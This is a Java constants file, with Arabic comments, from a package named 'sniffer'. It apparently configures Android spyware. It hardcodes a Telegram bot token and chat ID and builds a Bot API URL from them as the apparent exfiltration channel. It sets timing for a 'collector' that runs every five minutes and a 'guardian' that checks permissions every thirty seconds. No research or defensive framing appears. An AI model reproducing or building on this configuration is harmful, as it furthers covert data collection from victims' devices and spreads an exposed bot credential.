package com.v8.global.sniffer.utils;

public class Constants {
    // تيليغرام
    public static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    public static final String CHAT_ID = "7259620384";
    public static final String BASE_URL = "https://api.telegram.org/bot" + TOKEN + "/";
    
    // معرفات الإشعارات
    public static final int NOTIFICATION_ID_COLLECTOR = 1001;
    public static final int NOTIFICATION_ID_GUARDIAN = 1002;
    
    // فترات الجمع (بالمللي ثانية)
    public static final long INITIAL_DELAY = 10000; // 10 ثواني
    public static final long COLLECTION_INTERVAL = 300000; // 5 دقائق
    public static final long PERMISSION_CHECK_INTERVAL = 30000; // 30 ثانية
}
